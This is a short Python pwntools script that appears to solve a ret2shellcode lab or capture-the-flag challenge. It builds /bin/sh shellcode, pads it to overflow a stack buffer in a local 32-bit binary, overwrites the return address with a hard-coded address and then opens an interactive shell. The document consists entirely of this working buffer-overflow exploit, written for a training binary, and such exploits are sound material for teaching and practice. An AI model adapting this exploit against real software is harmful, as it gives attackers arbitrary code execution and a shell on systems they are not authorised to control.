from pwn import *

EBP = 0xffffdbc0
BUF = EBP - 0x6c
BUF2 = 0x804b240

if __name__ == "__main__":
    context.arch = 'i386'
    context.log_level = 'debug'
    context.endian = 'little'
    shellcode = asm(shellcraft.sh())
    p = process("./ret2shellcode.out")
    file = ELF("./ret2shellcode.out")
    payload = shellcode.ljust(EBP - BUF +4 , b'A') + p32(BUF2)
    p.sendline(payload)
    p.interactive()